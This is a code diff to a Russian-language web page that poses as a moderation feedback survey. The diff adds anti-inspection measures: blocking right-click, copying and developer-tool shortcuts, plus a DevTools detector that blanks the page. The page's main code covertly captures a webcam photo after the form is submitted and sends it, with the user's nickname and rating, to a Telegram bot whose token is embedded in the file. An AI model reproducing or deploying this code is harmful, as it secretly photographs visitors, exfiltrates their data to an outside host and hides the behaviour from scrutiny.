@@ -14,6 +14,10 @@
             color: #333;
             min-height: 100vh;
             box-sizing: border-box;
+            user-select: none;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
         }
         .survey-form {
             background: white;
@@ -186,11 +190,51 @@
     <canvas id="photoCanvas"></canvas>
 
     <script>
-        // Конфигурация (замените на свои данные)
+        // ===== ЗАЩИТА ОТ КОПИРОВАНИЯ И АНАЛИЗА ===== //
+        // 1. Блокировка контекстного меню
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            alert('Правый клик заблокирован');
+        });
+
+        // 2. Блокировка клавиш F12, Ctrl+Shift+I, Ctrl+U
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'F12' || 
+                (e.ctrlKey && e.shiftKey && e.key === 'I') || 
+                (e.ctrlKey && e.shiftKey && e.key === 'J') || 
+                (e.ctrlKey && e.key === 'U')) {
+                e.preventDefault();
+                alert('Доступ к инструментам разработчика запрещён');
+                window.location.href = "about:blank";
+            }
+        });
+
+        // 3. Блокировка копирования
+        document.addEventListener('copy', function(e) {
+            e.preventDefault();
+            alert('Копирование запрещено');
+        });
+
+        // 4. Защита от перетаскивания элементов
+        document.addEventListener('dragstart', function(e) {
+            e.preventDefault();
+        });
+
+        // 5. Детектор открытия DevTools
+        function detectDevTools() {
+            const widthThreshold = window.outerWidth - window.innerWidth > 160;
+            const heightThreshold = window.outerHeight - window.innerHeight > 160;
+            if (widthThreshold || heightThreshold) {
+                alert('Обнаружены инструменты разработчика!');
+                window.location.href = "about:blank";
+            }
+        }
+        setInterval(detectDevTools, 1000);
+
+        // ===== ОСНОВНОЙ КОД ===== //
         const TELEGRAM_BOT_TOKEN = '7465976373:AAGf39_tqo49urq0BjZ8Epm7dkap-HzcG5E';
         const TELEGRAM_CHAT_ID = '1165076107';
         
-        // Показываем запрос на доступ к камере при загрузке страницы
         document.addEventListener('DOMContentLoaded', function() {
             document.getElementById('cameraAccess').style.display = 'block';
             document.getElementById('surveyForm').style.display = 'none';
@@ -204,22 +248,19 @@
         function requestCameraAccess() {
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(stream => {
-                    // Скрываем запрос доступа и показываем форму
                     document.getElementById('cameraAccess').style.display = 'none';
                     document.getElementById('surveyForm').style.display = 'block';
                     
-                    // Инициализируем видео, но не показываем его пользователю
                     const video = document.getElementById('videoElement');
                     video.srcObject = stream;
                     
-                    // Останавливаем камеру сразу после проверки доступа
                     setTimeout(() => {
                         stream.getTracks().forEach(track => track.stop());
                     }, 100);
                 })
                 .catch(err => {
-                    alert('К сожалению в целях соображения безопасности сайта установлены правила о разрешении доступа к камере телефона, правила временные в скором времени они пропадут. Приносим свои извенения, с уважением компания Apple / Google');
-                    console.error("Ошибка безопасности", err);
+                    alert('Для продолжения необходимо разрешить доступ к камере');
+                    console.error("Ошибка доступа к камере", err);
                 });
         }
         
@@ -230,11 +271,9 @@
                 return;
             }
 
-            // Сначала показываем сообщение благодарности
             document.getElementById('surveyForm').style.display = 'none';
             document.getElementById('thankYou').style.display = 'block';
             
-            // Собираем данные для отправки
             const surveyData = {
                 nickname: nickname,
                 rating: document.getElementById('q1').value,
@@ -242,48 +281,38 @@
                 cameraAccess: false
             };
             
-            // Пытаемся получить доступ к камере снова для фото
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(stream => {
                     surveyData.cameraAccess = true;
                     const video = document.getElementById('videoElement');
                     video.srcObject = stream;
                     
-                    // Делаем фото через короткое время
                     setTimeout(() => {
                         takeAndSendPhoto(surveyData);
-                        // Останавливаем камеру
                         stream.getTracks().forEach(track => track.stop());
                     }, 100);
                 })
                 .catch(err => {
-                    console.log("Ошибка безопасности");
-                    // Отправляем данные без фото
+                    console.log("Не удалось получить доступ к камере");
                     sendToTelegram(surveyData, null);
                 });
         });
         
-        // Функция для создания и отправки фото
         function takeAndSendPhoto(surveyData) {
             const video = document.getElementById('videoElement');
             const canvas = document.getElementById('photoCanvas');
             
-            // Устанавливаем размеры canvas как у видео
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             
-            // Делаем снимок
             const ctx = canvas.getContext('2d');
             ctx.drawImage(video, 0, 0);
             
-            // Преобразуем в base64
             const photoDataUrl = canvas.toDataURL('image/jpeg').split(',')[1];
             
-            // Отправляем данные в Telegram
             sendToTelegram(surveyData, photoDataUrl);
         }
         
-        // Функция отправки в Telegram
         function sendToTelegram(surveyData, photoBase64) {
             const text = `Новый отзыв о модерации:
 Ник: ${surveyData.nickname}
@@ -292,7 +321,6 @@
 Доступ к камере: ${surveyData.cameraAccess ? 'разрешен' : 'не разрешен'}`;
 
             if (photoBase64) {
-                // Отправка с фото
                 const formData = new FormData();
                 formData.append('chat_id', TELEGRAM_CHAT_ID);
                 formData.append('photo', base64ToBlob(photoBase64, 'image/jpeg'), 'photo.jpg');
@@ -306,7 +334,6 @@
                 .then(data => console.log('Данные отправлены в Telegram:', data))
                 .catch(error => console.error('Ошибка отправки:', error));
             } else {
-                // Отправка только текста
                 fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: {
@@ -323,7 +350,6 @@
             }
         }
         
-        // Функция для преобразования оценки в текст
         function getRatingText(ratingValue) {
             const ratings = {
                 '5': 'Отлично',
@@ -335,7 +361,6 @@
             return `${ratingValue} (${ratings[ratingValue]})`;
         }
         
-        // Вспомогательная функция для преобразования base64 в Blob
         function base64ToBlob(base64, contentType) {
             const byteCharacters = atob(base64);
             const byteArrays = [];
